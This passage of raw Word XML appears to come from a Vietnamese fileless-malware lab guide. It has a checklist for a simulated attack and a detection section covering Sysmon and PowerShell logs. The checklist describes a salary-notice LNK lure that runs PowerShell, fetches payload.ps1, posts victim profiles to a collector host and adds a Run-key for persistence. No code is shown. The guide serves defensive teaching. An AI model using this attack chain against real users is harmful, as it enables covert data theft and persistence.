          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Double-click LNK làm PowerShell chạy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Victim không thấy popup/success rõ ràng sau khi mở LNK.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Static server port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> có request </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>GET /ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Static server port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> có request </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>GET /payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Collector server port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> có request </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>POST /collect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Attacker nhận được </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>collections\victim-profile-*.json</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Khi mất mạng, victim có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>%TEMP%\FilelessLab\queue\victim-profile-*.json</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] Khi có mạng lại, queued profile được gửi về attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Victim có Registry Run key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>FilelessLabDemo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Sysmon có Event ID 1 cho </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Sysmon có Event ID 3 từ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> đến </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.1:8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Sysmon có Event ID 3 từ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> đến </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.1:8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> khi collector online.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>[ ] PowerShell Operational có Event ID 4104.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Không có payload </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.dll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.b64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> hoặc </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload-decoded.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> được tạo trên victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Đã cleanup Registry Run key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>FilelessLabDemo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Đã cleanup </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>%TEMP%\FilelessLab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="0"/>
      </w:pPr>
      <w:r>
        <w:t>03 - Detection và phòng thủ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Tư duy phát hiện Fileless Malware</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Với Fileless Malware, không nên chỉ hỏi:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>File độc hại nằm ở đâu?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nên hỏi:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Công cụ hợp pháp nào đang bị dùng sai mục đích?</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Process nào gọi process nào?</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Command line có bất thường không?</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Process nào tạo kết nối mạng?</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Nội dung script có được PowerShell xử lý không?</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Payload có được ghi xuống đĩa không?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trong lab hiện tại, payload không được lưu thành file trên victim. Vì vậy detection phải dựa vào hành vi:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>explorer.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> sinh ra </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> sau khi người dùng mở LNK.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> kết nối tới </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.1:8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> để tải payload.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> kết nối tới </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.1:8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> để gửi profile.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>PowerShell xử lý nội dung script tải từ HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Payload gửi JSON profile về attacker qua </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>POST /collect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Nếu không có mạng, payload lưu JSON profile vào </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>%TEMP%\FilelessLab\queue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Payload tạo Registry Run key </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>FilelessLabDemo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> để mô phỏng persistence.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Không có file payload </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.dll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>.b64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> hoặc </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload-decoded.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> trên victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Log cần đọc</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.1. Sysmon Event ID 1 - Process Creation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Cần nhìn:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Image</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>: process nào được chạy.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ParentImage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>: process cha là gì.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>CommandLine</w:t>
      </w:r>
      <w:r>
        <w:rPr>
